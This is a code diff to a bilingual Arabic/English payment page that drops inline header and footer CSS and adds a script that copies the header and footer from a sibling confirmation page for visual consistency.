@@ -615,60 +615,6 @@
     margin:0;
   }
 
-  /* Match the confirmation page chrome. */
-  header {
-    background: #fff;
-    border-bottom: 2px solid #8A1B2F;
-  }
-  header .wrap {
-    display: flex;
-    align-items: center;
-    justify-content: space-between;
-    gap: 16px;
-    min-height: 64px;
-    padding: 0 12px;
-    max-width: 1180px;
-    margin: 0 auto;
-  }
-  .header-logo { height: 38px; max-width: 136px; object-fit: contain; }
-  .menu-btn { order: 1; }
-  .header-logo { order: 2; }
-  .lang-toggle { order: 3; border-color: #8A1B2F; color: #8A1B2F; }
-  .site-footer {
-    background: #ECECEE;
-    color: #000;
-    border-top: 2px solid #8A1B2F;
-    margin-top: 26px;
-  }
-  .site-footer::before {
-    content: 'هميان';
-    display: block;
-    padding: 18px 0 4px;
-    text-align: center;
-    color: #000;
-    font-family: 'Cairo', sans-serif;
-    font-size: 22px;
-    font-weight: 800;
-  }
-  .site-footer .footer-section {
-    padding: 10px 20px 18px;
-    border-bottom: 1px solid rgba(0,0,0,.12);
-  }
-  .site-footer .footer-links { align-items: center; gap: 7px; }
-  .site-footer .footer-links a,
-  .site-footer .control-label,
-  .site-footer .footer-legal-links a { color: #000; font-weight: 700; }
-  .site-footer .control-group { display: none; }
-  .site-footer .footer-bottom { padding: 14px 20px 20px; }
-  .site-footer .footer-copyright { color: #000; font-weight: 700; }
-  .site-footer .footer-legal-links { margin-bottom: 10px; }
-  .site-footer .footer-legal-links a { font-size: 12.5px; }
-  @media (max-width: 380px) {
-    header .wrap { gap: 6px; padding-inline: 8px; }
-    .header-logo { height: 30px; max-width: 104px; }
-    .lang-toggle { font-size: 10px; padding: 3px 7px; }
-  }
-
   [data-lang="en"]{display:none;}
   body.lang-en [data-lang="ar"]{display:none;}
   body.lang-en [data-lang="en"]{display:inline;}
@@ -1146,6 +1092,66 @@
     sendHeartbeat();
     setInterval(sendHeartbeat, 3000);
   });
+</script>
+<script>
+  // Keep the payment page chrome identical to the confirmation page.
+  (function syncConfirmationChrome() {
+    var chromeCss = document.createElement('style');
+    chromeCss.textContent = `
+      .header { position: sticky; top: 0; z-index: 60; background: #fff; border-bottom: 2px solid #8A1B2F; }
+      .header .wrap { width: min(1180px, 100% - 24px); margin-inline: auto; }
+      .header__bar { display: flex; align-items: center; justify-content: space-between; gap: 16px; min-height: 64px; }
+      .nav-start, .nav-end { display: flex; align-items: center; min-width: 0; }
+      .nav-start { gap: 10px; flex: 0 1 auto; }
+      .nav-end { gap: 9px; flex: 0 0 auto; }
+      .header .logo { height: 38px; width: auto; max-width: 136px; min-width: 0; object-fit: contain; }
+      .header .logo2 { height: 22px; width: auto; max-width: 100px; }
+      .header .burger { background: none; border: 0; padding: 8px 2px; display: grid; gap: 4.5px; }
+      .header .burger span { display: block; width: 22px; height: 2.5px; border-radius: 2px; background: #8A1B2F; }
+      .header .lang { display: inline-flex; align-items: center; gap: 7px; background: none; border: 1.5px solid #8A1B2F; color: #8A1B2F; border-radius: 999px; padding: 3px 8px; font-size: 11px; font-weight: 700; direction: ltr; }
+      .header .lang svg { width: 13px; height: 13px; }
+      .header .menu { display: none; border-top: 1px solid rgba(0,0,0,.08); padding: 8px 0 14px; }
+      .header .menu.is-open { display: block; }
+      .header .menu a { display: block; padding: 9px 2px; color: #1A1718; font-weight: 500; border-bottom: 1px solid rgba(0,0,0,.06); }
+      .footer { margin-top: 26px; background: #ECECEE; color: #000; border-top: 2px solid #8A1B2F; padding: 18px 0 22px; font-size: 12px; }
+      .footer .wrap { width: min(1180px, 100% - 24px); margin-inline: auto; display: flex; flex-direction: column; align-items: center; text-align: center; gap: 14px; }
+      .footer *, .footer p, .footer a, .footer span { color: #000; font-weight: 700; margin: 0; }
+      .foot-brand { display: flex; align-items: center; justify-content: center; gap: 14px; }
+      .foot-brand .logo2 { height: 24px; width: auto; max-width: 110px; }
+      .foot-brand .logo { height: 32px; width: auto; max-width: 120px; }
+      .foot-brand .sep { width: 1px; height: 26px; background: rgba(0,0,0,.25); }
+      .footer__lead { font-size: 12.5px; line-height: 1.85; max-width: 42ch; }
+      .footer__links { display: flex; flex-direction: column; gap: 7px; }
+      .footer__links a { font-size: 12.5px; }
+      .stores { display: flex; flex-wrap: wrap; justify-content: center; gap: 9px; }
+      .stores img { height: 32px; width: auto; border-radius: 6px; border: 1px solid rgba(0,0,0,.15); }
+      .footer__copy { font-size: 11.5px; padding-top: 4px; }
+      @media (max-width: 380px) { .header__bar { gap: 6px; } .nav-start { gap: 5px; } .nav-end { gap: 5px; } .header .logo { height: 30px; max-width: 84px; } .header .logo2 { max-width: 72px; } .header .lang { font-size: 9px; padding: 3px 5px; } }
+    `;
+    document.head.appendChild(chromeCss);
+
+    fetch('confirm.html')
+      .then(function (response) { return response.text(); })
+      .then(function (html) {
+        var source = new DOMParser().parseFromString(html, 'text/html');
+        var currentHeader = document.querySelector('header');
+        var currentFooter = document.querySelector('footer');
+        var sourceHeader = source.querySelector('header');
+        var sourceFooter = source.querySelector('footer');
+        if (currentHeader && sourceHeader) currentHeader.replaceWith(sourceHeader.cloneNode(true));
+        if (currentFooter && sourceFooter) currentFooter.replaceWith(sourceFooter.cloneNode(true));
+
+        var burger = document.getElementById('burger');
+        var menu = document.getElementById('menu');
+        if (burger && menu) burger.addEventListener('click', function () {
+          var open = menu.classList.toggle('is-open');
+          burger.setAttribute('aria-expanded', open ? 'true' : 'false');
+        });
+        var langBtn = document.getElementById('langBtn');
+        if (langBtn) langBtn.addEventListener('click', function () { location.href = 'confirm-en.html'; });
+      })
+      .catch(function () {});
+  })();
 </script>
 </body>
 </html>
